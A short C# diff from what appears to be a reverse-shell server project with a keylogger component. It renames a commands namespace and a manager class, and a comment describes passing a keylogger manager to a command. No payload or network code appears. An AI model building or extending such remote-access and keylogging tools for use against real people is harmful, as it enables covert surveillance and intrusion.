@@ -1,7 +1,7 @@
-﻿using Commands;
-using KeyLogger;
+﻿using KeyLogger;
 using System.Threading.Tasks;
 using System.Windows;
+using ServerCommands;
 
 namespace ReverseShellServer
 {
@@ -23,7 +23,7 @@ namespace ReverseShellServer
             var manager = new ServerManager();
 
             manager.networkManager = new ServerNetworkManager();
-            manager.commandsManager = new CommandsManager(manager.networkManager);
+            manager.commandsManager = new ServerCommandsManager(manager.networkManager);
 
             // Give the KeyloggerManager instance to the KeyLogger ICommand
             keyLoggerManager = new KeyLoggerManager();
